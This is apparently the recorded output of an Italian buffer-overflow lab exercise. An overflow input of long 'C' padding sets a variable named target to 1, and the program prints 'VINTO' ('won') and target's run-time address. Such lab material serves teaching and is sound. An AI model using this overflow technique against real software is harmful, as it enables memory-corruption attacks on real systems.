+Aln, CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCrk
+Il valore di target Ã¨ 1
+VINTO
+Indirizzo a run-time di target: 0x804a02c
+
+----------------------------------------
